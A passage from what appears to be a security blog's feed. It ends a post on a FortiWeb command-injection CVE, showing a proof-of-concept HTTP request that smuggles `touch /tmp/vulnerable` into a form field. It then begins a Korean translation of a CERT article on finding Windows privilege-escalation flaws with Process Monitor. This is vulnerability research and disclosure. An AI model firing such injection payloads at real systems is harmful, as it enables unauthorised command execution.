application/json, text/plain, *<span class="hljs-comment">/*</span><span class="hljs-comment">Accept-Language: en-US,en;q=0.5</span><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><span class="hljs-comment">Referer: https://[redacted]/root/user/remote-user/saml-user/</span><span class="hljs-comment">X-Csrftoken: 814940160</span><span class="hljs-comment">Content-Type: multipart/form-data; boundary=---------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Length: 3068</span><span class="hljs-comment">Origin: https://[redacted]</span><span class="hljs-comment">Dnt: 1</span><span class="hljs-comment">Te: trailers</span><span class="hljs-comment">Connection: close</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;q_type&quot;</span><span class="hljs-comment">1</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;name&quot;</span><span class="hljs-comment">`touch /tmp/vulnerable`</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;entityID&quot;</span><span class="hljs-comment">test</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;service-path&quot;</span><span class="hljs-comment">/saml.sso</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;session-lifetime&quot;</span><span class="hljs-comment">8</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;session-timeout&quot;</span><span class="hljs-comment">30</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;sso-bind&quot;</span><span class="hljs-comment">post</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;sso-bind_val&quot;</span><span class="hljs-comment">1</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;sso-path&quot;</span><span class="hljs-comment">/SAML2/POST</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;slo-bind&quot;</span><span class="hljs-comment">post</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;slo-bind_val&quot;</span><span class="hljs-comment">1</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;slo-path&quot;</span><span class="hljs-comment">/SLO/POST</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;flag&quot;</span><span class="hljs-comment">0</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;enforce-signing&quot;</span><span class="hljs-comment">disable</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;enforce-signing_val&quot;</span><span class="hljs-comment">0</span><span class="hljs-comment">-----------------------------94351131111899571381631694412</span><span class="hljs-comment">Content-Disposition: form-data; name=&quot;metafile&quot;; filename=&quot;test.xml&quot;</span><span class="hljs-comment">Content-Type: text/xml</span><span class="hljs-comment">&lt;?xml version=&quot;1.0&quot;?&gt;</span><span class="hljs-comment">&lt;md:EntityDescriptor xmlns:md=&quot;urn:oasis:names:tc:SAML:2.0:metadata&quot; validUntil=&quot;2021-06-12T16:54:31Z&quot; cacheDuration=&quot;PT1623948871S&quot; entityID=&quot;test&quot;&gt;</span><span class="hljs-comment">&lt;md:IDPSSODescriptor WantAuthnRequestsSigned=&quot;false&quot; protocolSupportEnumeration=&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot;&gt;</span><span class="hljs-comment">&lt;md:KeyDescriptor use=&quot;signing&quot;&gt;</span><span class="hljs-comment">&lt;ds:KeyInfo xmlns:ds=&quot;http://www.w3.org/2000/09/xmldsig#&quot;&gt;</span><span class="hljs-comment">&lt;ds:X509Data&gt;</span><span class="hljs-comment">&lt;ds:X509Certificate&gt;test&lt;/ds:X509Certificate&gt;</span><span class="hljs-comment">&lt;/ds:X509Data&gt;</span><span class="hljs-comment">&lt;/ds:KeyInfo&gt;</span><span class="hljs-comment">&lt;/md:KeyDescriptor&gt;</span><span class="hljs-comment">&lt;md:KeyDescriptor use=&quot;encryption&quot;&gt;</span><span class="hljs-comment">&lt;ds:KeyInfo xmlns:ds=&quot;http://www.w3.org/2000/09/xmldsig#&quot;&gt;</span><span class="hljs-comment">&lt;ds:X509Data&gt;</span><span class="hljs-comment">&lt;ds:X509Certificate&gt;test&lt;/ds:X509Certificate&gt;</span><span class="hljs-comment">&lt;/ds:X509Data&gt;</span><span class="hljs-comment">&lt;/ds:KeyInfo&gt;</span><span class="hljs-comment">&lt;/md:KeyDescriptor&gt;</span><span class="hljs-comment">&lt;md:NameIDFormat&gt;urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified&lt;/md:NameIDFormat&gt;</span><span class="hljs-comment">&lt;md:SingleSignOnService Binding=&quot;urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect&quot; Location=&quot;test&quot;/&gt;</span><span class="hljs-comment">&lt;/md:IDPSSODescriptor&gt;</span><span class="hljs-comment">&lt;/md:EntityDescriptor&gt;</span><span class="hljs-comment">-----------------------------94351131111899571381631694412--</span><span class="hljs-comment">HTTP/1.1 500 Internal Server Error</span><span class="hljs-comment">Date: Thu, 10 Jun 2021 11:59:45 GMT</span><span class="hljs-comment">Cache-Control: no-cache, no-store, must-revalidate</span><span class="hljs-comment">Pragma: no-cache</span><span class="hljs-comment">Set-Cookie: [redacted]</span><span class="hljs-comment">X-Frame-Options: SAMEORIGIN</span><span class="hljs-comment">X-XSS-Protection: 1; mode=block</span><span class="hljs-comment">Content-Security-Policy: frame-ancestors &apos;self&apos;</span><span class="hljs-comment">X-Content-Type-Options: nosniff</span><span class="hljs-comment">Content-Length: 20</span><span class="hljs-comment">Strict-Transport-Security: max-age=63072000</span><span class="hljs-comment">Connection: close</span><span class="hljs-comment">Content-Type: application/json</span><span class="hljs-comment">{&quot;errcode&quot;: &quot;-651&quot;}</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>j0ker</tag>
      
      <tag>fortinet</tag>
      
      <tag>fortiwebos</tag>
      
      <tag>command_injection</tag>
      
      <tag>waf</tag>
      
      <tag>CVE-2021-22123</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] Process Monitor로 Windows의 권한 상승 취약점 찾기</title>
    <link href="/2021/08/18/l0ch/procmon-lpe/"/>
    <url>/2021/08/18/l0ch/procmon-lpe/</url>
    
    <content type="html"><![CDATA[<p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694; L0ch&#xC785;&#xB2C8;&#xB2E4;! &#xC624;&#xB298; &#xB4E4;&#xACE0;&#xC628; &#xBC88;&#xC5ED;&#xAE00;&#xC740; &#xBCF5;&#xC7A1;&#xD55C; &#xBD84;&#xC11D; &#xC5C6;&#xC774; Process Monitor&#xB85C;&#xB9CC; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB294; Windows&#xC758; &#xAC04;&#xB2E8;&#xD55C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC778;&#xB370;&#xC694;, &#xC26C;&#xC6B4; &#xB0B4;&#xC6A9;&#xC774;&#xB77C; &#xBD80;&#xB2F4;&#xC5C6;&#xC774; &#xC77D;&#xAE30; &#xC88B;&#xC744; &#xAC83; &#xAC19;&#xC544; &#xC2AC;&#xCA4D; &#xBC88;&#xC5ED;&#xD574;&#xC654;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E;</p><blockquote><p>&#xC6D0;&#xBB38; : <a href="https://vuls.cert.org/confluence/display/Wiki/2021/06/21/Finding+Privilege+Escalation+Vulnerabilities+in+Windows+using+Process+Monitor#FindingPrivilegeEscalationVulnerabilitiesinWindowsusingProcessMonitor-Useofalibrarythatloadsfromanunexpectedpath">Finding Privilege Escalation Vulnerabilities in Windows using Process Monitor</a></p></blockquote><hr><h1 id="&#xAC1C;&#xC694;"><a href="#&#xAC1C;&#xC694;" class="headerlink" title="&#xAC1C;&#xC694;"></a>&#xAC1C;&#xC694;</h1><p>&#xC774; &#xAC8C;&#xC2DC;&#xBB3C;&#xC740; &#xCC3E;&#xB294; &#xC0AC;&#xB78C;&#xC774; &#xB4DC;&#xBB38; Windows&#xC758; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574; &#xC124;&#xBA85;&#xD55C;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xBD80;&#xBD84;&#xC801;&#xC73C;&#xB85C; &#xC644;&#xD654;&#xD560; &#xC218; &#xC788;&#xB294; &#xBA87; &#xAC00;&#xC9C0; &#xBC29;&#xBC95;&#xC744; &#xC18C;&#xAC1C;&#xD55C;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xB0B4;&#xAC00; &#xBCF4;&#xACE0;&#xC2F6;&#xC5B4;&#xD558;&#xB294; &#xBCC0;&#xD654;&#xB294; &#xAC1C;&#xBC1C;&#xC790;&#xAC00; &#xCC98;&#xC74C;&#xBD80;&#xD130; &#xC774;&#xB7EC;&#xD55C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC778;&#xC9C0;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><p><a href="https://vuls.cert.org/confluence/display/tools/CERT+BFF+-+Basic+Fuzzing+Framework">CERT BFF</a>&#xB97C; &#xCC98;&#xC74C; &#xCD9C;&#xC2DC;&#xD588;&#xC744; &#xB54C; &#xBA54;&#xBAA8;&#xB9AC; &#xCEE4;&#xB7FD;&#xC158; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xAC1C;&#xB150; &#xC99D;&#xBA85; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC744; &#xAD6C;&#xC131;&#xD558;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xB2E4;.</p><ol><li>&#xD0C0;&#xAC9F;&#xC758; instruction pointer&#xB97C; &#xC81C;&#xC5B4;&#xD560; &#xC218; &#xC788;&#xC744;&#xB54C;&#xAE4C;&#xC9C0; &#xD37C;&#xC9D5;&#xD55C;&#xB2E4;.</li><li><a href="https://insights.sei.cmu.edu/blog/visualizing-cert-bff-string-minimization/">BFF string minimization</a>&#xC744; &#xC0AC;&#xC6A9;&#xD574; &#xC258;&#xCF54;&#xB4DC;&#xB97C; &#xC800;&#xC7A5;&#xD558;&#xB294;&#xB370; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294; &#xACF5;&#xAC04;&#xC744; &#xCC3E;&#xB294;&#xB2E4;.</li><li>&#xD544;&#xC694;&#xC5D0; &#xB530;&#xB77C; <a href="https://en.wikipedia.org/wiki/Return-oriented_programming">ROP</a>&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xC258;&#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xD750;&#xB984;&#xC744; &#xC218;&#xC815;&#xD55C;&#xB2E4;.</li></ol><p>CERT BFF&#xB97C; &#xC0AC;&#xC6A9;&#xD574; PoC&#xAE4C;&#xC9C0; &#xB3C4;&#xB2EC;&#xD558;&#xB294; &#xAC83;&#xC740; &#xBE44;&#xAD50;&#xC801; &#xAC04;&#xB2E8;&#xD588;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC2DC;&#xAC04;&#xC774; &#xC9C0;&#xB0A8;&#xC5D0; &#xB530;&#xB77C; &#xBA54;&#xBAA8;&#xB9AC; &#xCEE4;&#xB7FD;&#xC158; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xB294; &#xAE30;&#xC900;&#xC774; &#xB192;&#xC544;&#xC84C;&#xB294;&#xB370;, &#xC774;&#xAC83;&#xC740; &#xC218;&#xB144;&#xC5D0; &#xAC78;&#xCCD0; &#xC77C;&#xC5B4;&#xB09C; &#xB450; &#xAC00;&#xC9C0; &#xC77C; &#xB54C;&#xBB38;&#xC77C; &#xC218; &#xC788;&#xB2E4;.</p><ol><li>&#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xACF5;&#xAE09; &#xC5C5;&#xCCB4;&#xC758; &#xD37C;&#xC9D5;&#xD14C;&#xC2A4;&#xD2B8; &#xC99D;&#xAC00;</li><li>&#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4; &#xBC0F; &#xD50C;&#xB7AB;&#xD3FC; &#xBAA8;&#xB450;&#xC5D0;&#xC11C;&#xC758; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xBBF8;&#xD2F0;&#xAC8C;&#xC774;&#xC158; &#xC874;&#xC7AC; &#xC99D;&#xAC00;</li></ol><p>&#xCD5C;&#xADFC; BFF &#xCD08;&#xAE30;&#xB97C; &#xC0DD;&#xAC01;&#xB098;&#xAC8C; &#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810; &#xBC1C;&#xACAC; &#xAE30;&#xC220;&#xC5D0; &#xB300;&#xD574; &#xC791;&#xC5C5;&#xD588;&#xB2E4;. &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294; &#xAC83;&#xACFC; &#xC545;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xC5BC;&#xB9C8;&#xB098; &#xC26C;&#xC6B4;&#xC9C0;&#xC5D0; &#xB300;&#xD574; &#xB290;&#xAF08;&#xC73C;&#xBA70; &#xAC1C;&#xB150;&#xC774; &#xB108;&#xBB34; &#xC0AC;&#xC18C;&#xD574;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294; &#xB370; &#xC131;&#xACF5;&#xD588;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC5D0; &#xB180;&#xB790;&#xB2E4;. BFF&#xB97C; &#xC0AC;&#xC6A9;&#xD55C; &#xD37C;&#xC9D5;&#xC5D0;&#xC11C; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xAE4C;&#xC9C0;&#xC758; &#xC544;&#xC774;&#xB514;&#xC5B4;&#xAC00; &#xC2DC;&#xAC04;&#xC774; &#xC9C0;&#xB0A8;&#xC5D0; &#xB530;&#xB77C; &#xC810;&#xC810; &#xC5B4;&#xB824;&#xC6CC;&#xC9C4; &#xAC83;&#xCC98;&#xB7FC; &#xC774; &#xAE30;&#xC220;&#xB85C; &#xC27D;&#xAC8C; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xD6E8;&#xC52C; &#xC904;&#xC5B4;&#xB4E4;&#xC5C8;&#xC73C;&#xBA74; &#xD55C;&#xB2E4;.</p><p>&#xC774; &#xAC8C;&#xC2DC;&#xBB3C;&#xC5D0;&#xC11C;&#xB294; <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Sysinternals Process Monitor</a> (Procmon)&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xC5EC; &#xBC1C;&#xACAC;&#xD55C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810; &#xC911; &#xC77C;&#xBD80;&#xB97C; &#xACF5;&#xC720;&#xD560; &#xAC83;&#xC774;&#xB2E4;.</p><h1 id="&#xAC1C;&#xB150;"><a href="#&#xAC1C;&#xB150;" class="headerlink" title="&#xAC1C;&#xB150;"></a>&#xAC1C;&#xB150;</h1><p>&#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; Windows &#xD50C;&#xB7AB;&#xD3FC;&#xC5D0; &#xC124;&#xCE58;&#xB418;&#xBA74; &#xD604;&#xC7AC; &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0; &#xB85C;&#xADF8;&#xC628;&#xD55C; &#xC0AC;&#xC6A9;&#xC790; &#xAD8C;&#xD55C;&#xC5D0; &#xAD00;&#xACC4;&#xC5C6;&#xC774; &#xC77C;&#xBD80; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xAC00; &#xB192;&#xC740; &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB420; &#xC218; &#xC788;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xAD8C;&#xD55C; &#xC788;&#xB294; &#xAD6C;&#xC131; &#xC694;&#xC18C;&#xC5D0;&#xB294; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xB450; &#xAC00;&#xC9C0; &#xD615;&#xC2DD;&#xC774; &#xC788;&#xB2E4;.</p><ol><li>&#xC124;&#xCE58;&#xB41C; &#xC11C;&#xBE44;&#xC2A4;</li><li>&#xC608;&#xC57D;&#xB41C; &#xC791;&#xC5C5;(Task)</li></ol><p>&#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC601;&#xD5A5;&#xC744; &#xC904; &#xC218; &#xC788;&#xB294; &#xB9AC;&#xC18C;&#xC2A4;&#xC640; &#xAD8C;&#xD55C;&#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xC0C1;&#xD638;&#xC791;&#xC6A9;&#xD560; &#xB54C;&#xB9C8;&#xB2E4; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC131;&#xC758; &#xAC00;&#xB2A5;&#xC131;&#xC774; &#xB192;&#xC544;&#xC9C4;&#xB2E4;.</p><h1 id="&#xCC3E;&#xC544;&#xC57C;-&#xD558;&#xB294;-&#xAC83;"><a href="#&#xCC3E;&#xC544;&#xC57C;-&#xD558;&#xB294;-&#xAC83;" class="headerlink" title="&#xCC3E;&#xC544;&#xC57C; &#xD558;&#xB294; &#xAC83;"></a>&#xCC3E;&#xC544;&#xC57C; &#xD558;&#xB294; &#xAC83;</h1><p>&#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xB294; &#xAD8C;&#xD55C; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xB97C; &#xD655;&#xC778;&#xD558;&#xB294; &#xAC00;&#xC7A5; &#xC26C;&#xC6B4; &#xBC29;&#xBC95;&#xC740; &#xB2E4;&#xC74C; &#xC870;&#xAC74;&#xC744; &#xB9CC;&#xC871;&#xD558;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130; &#xD544;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;.</p><ol><li>&#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xB294; &#xD30C;&#xC77C; &#xB610;&#xB294; &#xB514;&#xB809;&#xD1A0;&#xB9AC;</li><li>&#xC0C1;&#xC2B9;&#xB41C; &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;</li><li>&#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC4F8; &#xC218; &#xC788;&#xB294; &#xC704;&#xCE58;</li></ol><p>1&#xACFC; 2&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130;&#xC5D0;&#xC11C; &#xAC04;&#xB2E8;&#xD558;&#xAC8C; &#xAD6C;&#xD604;&#xD560; &#xC218; &#xC788;&#xC73C;&#xB098; &#xAC80;&#xC0AC; 3&#xC740; &#xC880; &#xB354; &#xBCF5;&#xC7A1;&#xD558;&#xBA70; &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130; &#xD544;&#xD130;&#xB85C; &#xC218;&#xD589;&#xD560; &#xB54C; &#xC77C;&#xBD80; &#xC624;&#xD0D0;&#xC9C0;&#xAC00; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xB2E4;. &#xADF8;&#xB798;&#xC11C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCC3E;&#xB294; &#xB370; &#xC88B;&#xC740; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xB294; <a href="https://github.com/certcc/privesc">&#xD544;&#xD130;</a>&#xB97C; &#xB9CC;&#xB4E4;&#xC5C8;&#xB2E4; .</p><h1 id="&#xD544;&#xD130;-&#xC0AC;&#xC6A9;"><a href="#&#xD544;&#xD130;-&#xC0AC;&#xC6A9;" class="headerlink" title="&#xD544;&#xD130; &#xC0AC;&#xC6A9;"></a>&#xD544;&#xD130; &#xC0AC;&#xC6A9;</h1><p>Privesc.PMF &#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130; &#xD544;&#xD130;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC740; &#xBE44;&#xAD50;&#xC801; &#xAC04;&#xB2E8;&#xD558;&#xB2E4;.</p><ol><li>&#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130; &#xBD80;&#xD305; &#xB85C;&#xAE45; &#xD65C;&#xC131;&#xD654;(&#xC635;&#xC158; &#x2192; &#xBD80;&#xD305; &#xB85C;&#xAE45; &#xD65C;&#xC131;&#xD654;)</li><li>&#xC7AC;&#xBD80;&#xD305; &#xBC0F; &#xB85C;&#xADF8;&#xC778;</li><li>&#xD504;&#xB85C;&#xC138;&#xC2A4; &#xBAA8;&#xB2C8;&#xD130; &#xC2E4;&#xD589;</li><li><p>&#xBA54;&#xC2DC;&#xC9C0;&#xAC00; &#xD45C;&#xC2DC;&#xB418;&#xBA74; &#xBD80;&#xD305; &#xB85C;&#xADF8;&#xB97C; &#xC800;&#xC7A5;&#xD55C;&#xB2E4;.</p><p> <img src="/2021/08/18/l0ch/procmon-lpe/Untitled.png" alt="Untitled"></p></li><li><p>Privesc &#xD544;&#xD130; &#xAC00;&#xC838;&#xC624;&#xAE30;(&#xD544;&#xD130; &#x2192; &#xD544;&#xD130; &#xAD6C;&#xC131; &#x2192; &#xAC00;&#xC838;&#xC624;&#xAE30;&#x2026;)</p></li><li>Privesc &#xD544;&#xD130; &#xC801;&#xC6A9;(Filter &#x2192; Load Filter &#x2192; Privesc)</li><li>&#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; &#xD30C;&#xC77C; &#xC561;&#xC138;&#xC2A4;&#xB97C; &#xCC3E;&#xC544; &#xC870;&#xC0AC;</li></ol><h1 id="&#xC870;&#xC0AC;-&#xACB0;&#xACFC;"><a href="#&#xC870;&#xC0AC;-&#xACB0;&#xACFC;" class="headerlink" title="&#xC870;&#xC0AC; &#xACB0;&#xACFC;"></a>&#xC870;&#xC0AC; &#xACB0;&#xACFC;</h1><p>VMware Tools&#xAC00; &#xC124;&#xCE58;&#xB41C; 64&#xBE44;&#xD2B8; Windows 10 2004 &#xC2DC;&#xC2A4;&#xD15C;&#xC5D0;&#xC11C;&#xC758; &#xBD80;&#xD2B8; &#xB85C;&#xADF8;&#xBD80;&#xD130; &#xC0B4;&#xD3B4;&#xBCF8;&#xB2E4;.</p><p><img src="/2021/08/18/l0ch/procmon-lpe/Untitled%201.png" alt="Untitled"></p><p>VM&#xC5D0; &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xAC00; &#xAC70;&#xC758; &#xC124;&#xCE58;&#xB418;&#xC5B4; &#xC788;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xC774;&#xBBF8; &#xC758;&#xC2EC;&#xC2A4;&#xB7EC;&#xC6B4; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xB2E4;.</p><pre><code class="hljs c">C:\Program%<span class="hljs-number">20F</span>iles\</code></pre><p>Windows &#xC0AC;&#xC6A9;&#xC790;&#xB294; <code>C:\Program Files\</code> &#xACBD;&#xB85C;&#xC5D0; &#xC775;&#xC219;&#xD558;&#xC9C0;&#xB9CC; &#xC704; &#xACB0;&#xACFC;&#xC5D0; &#xD3EC;&#xD568;&#xB41C; <code>%20</code>&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xBB38;&#xC790;&#xB294; &#xC544;&#xB2CC; &#xAC83; &#xAC19;&#xB2E4;. &#xC65C; &#xC774;&#xB7EC;&#xD55C; &#xACB0;&#xACFC;&#xAC00; &#xB098;&#xD0C0;&#xB098;&#xB294;&#xC9C0;&#xB294; &#xC544;&#xB798; &#xC139;&#xC158;&#xC5D0;&#xC11C; &#xB2E4;&#xB8E8;&#xB3C4;&#xB85D; &#xD55C;&#xB2E4;.</p><h1 id="&#xAC1C;&#xBC1C;&#xC790;&#xC758;-&#xC2E4;&#xC218;"><a href="#&#xAC1C;&#xBC1C;&#xC790;&#xC758;-&#xC2E4;&#xC218;" class="headerlink" title="&#xAC1C;&#xBC1C;&#xC790;&#xC758; &#xC2E4;&#xC218;"></a>&#xAC1C;&#xBC1C;&#xC790;&#xC758; &#xC2E4;&#xC218;</h1><p>&#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xAC00; &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; &#xC0AC;&#xC6A9;&#xC790;&#xC758; &#xC601;&#xD5A5;&#xC744; &#xBC1B;&#xC744; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xD558;&#xB294; &#xAC1C;&#xBC1C;&#xC790;&#xC758; &#xB9CE;&#xC740; &#xC2E4;&#xC218;&#xAC00; &#xC874;&#xC7AC;&#xD55C;&#xB2E4;. Windows &#xC751;&#xC6A9; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xB2E8;&#xC21C; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9; &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xAD00;&#xB828;&#xD558;&#xC5EC; &#xB0B4;&#xAC00; &#xBC1C;&#xACAC;&#xD55C; &#xC2E4;&#xC218;&#xB294; &#xB450; &#xAC00;&#xC9C0; &#xC8FC;&#xC694; &#xBC94;&#xC8FC;&#xB85C; &#xB098;&#xB25C;&#xB2E4;.</p><ol><li>&#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; &#xACBD;&#xB85C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD568;</li><li>&#xC0AC;&#xC6A9; &#xC911;&#xC778; &#xACBD;&#xB85C;&#xC5D0; &#xC608;&#xC0C1;&#xCE58; &#xBABB;&#xD55C; ACL(&#xC561;&#xC138;&#xC2A4; &#xC81C;&#xC5B4; &#xBAA9;&#xB85D;)&#xC774; &#xC801;&#xC6A9;&#xB428;</li></ol><h2 id="&#xC608;&#xAE30;&#xCE58;-&#xC54A;&#xC740;-&#xACBD;&#xB85C;-&#xC561;&#xC138;&#xC2A4;"><a href="#&#xC608;&#xAE30;&#xCE58;-&#xC54A;&#xC740;-&#xACBD;&#xB85C;-&#xC561;&#xC138;&#xC2A4;" class="headerlink" title="&#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; &#xACBD;&#xB85C; &#xC561;&#xC138;&#xC2A4;"></a>&#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; &#xACBD;&#xB85C; &#xC561;&#xC138;&#xC2A4;</h2><p>&#xACBD;&#xC6B0;&#xC5D0; &#xB530;&#xB77C; &#xD504;&#xB85C;&#xADF8;&#xB7A8; &#xC2E4;&#xD589; &#xC911;&#xC5D0; &#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; &#xACBD;&#xB85C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD55C;&#xB2E4;. &#xC989;, &#xAC1C;&#xBC1C;&#xC790;&#xB294; &#xC774;&#xB7EC;&#xD55C; &#xACBD;&#xB85C;&#xC5D0; &#xC561;&#xC138;&#xC2A4;&#xD558;&#xACE0; &#xC788;&#xB2E4;&#xB294; &#xC0AC;&#xC2E4;&#xC744; &#xC54C;&#xAC8C; &#xB418;&#xBA74; &#xC544;&#xB9C8; &#xB180;&#xB784; &#xAC83;&#xC774;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; &#xACBD;&#xB85C; &#xC561;&#xC138;&#xC2A4;&#xB294; &#xC5EC;&#xB7EC; &#xAC00;&#xC9C0; &#xC774;&#xC720;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><h3 id="URL-&#xC778;&#xCF54;&#xB529;-&#xACBD;&#xB85C;"><a 